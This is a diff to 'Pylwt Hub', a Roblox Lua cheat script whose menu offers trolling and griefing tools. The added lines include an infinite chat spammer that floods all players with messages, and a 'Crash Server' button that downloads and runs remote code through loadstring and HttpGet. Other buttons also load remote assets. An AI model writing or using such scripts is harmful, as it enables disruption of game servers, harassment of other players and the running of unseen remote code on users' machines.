@@ -1,3 +1,6 @@
+-- OG Pylwt Hub
+-- Made by Pylwt#6567
+
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("Welcome To Pylwt Hub", "DarkTheme")
 local Main = Window:NewTab("Main")
@@ -645,7 +648,16 @@ TrollingSection:NewButton("Chat Remover", "Click to get tool", function()
     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
     end
 end)
+TrollingSection:NewButton("Chat Spammer", "Click to get tool", function()
+    while true do wait(0) 
+
+        local A_1 = "MADE BY PYLWT HUB" local A_2 = "All" 
+        local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) end
+end)
 local TrollingSection = Trolling:NewSection("Broken Stuff")
+TrollingSection:NewButton("Crash Server", "WARNING", function()
+    loadstring(game:HttpGet("https://github.com/Pylwt/crash/blob/main/README.md", true))() 
+end)
 TrollingSection:NewButton("Void Spin", "Click to get tool", function()
 power = 500 -- change this to make it more or less powerful
 game:GetService('RunService').Stepped:connect(function()
@@ -687,7 +699,6 @@ TrollingSection:NewButton("Freeze Time", "Press Left Ctrl", function()
     game:GetService("UserInputService").InputBegan:connect(onKeyPress)
     game:GetService("UserInputService").InputBegan:connect(onKeyPress)
 end)
-
 TrollingSection:NewButton("Clones", "Click to get tool", function()
     loadstring(game:GetObjects('rbxassetid://7339698872')[1].Source)() 
 end)
@@ -840,4 +851,4 @@ local CreditsSection = Credits:NewSection("Thank you for choosing Pylwt Hub!")
 local CreditsSection = Credits:NewSection("- - - - - - - - - - - - - - - - - - - - - - -")
 local CreditsSection = Credits:NewSection("Theme: OG Dark")
 local CreditsSection = Credits:NewSection("Last Update: 20th Of July 2022")
-local CreditsSection = Credits:NewSection("Version: 2.14")
+local CreditsSection = Credits:NewSection("Version: 2.15")
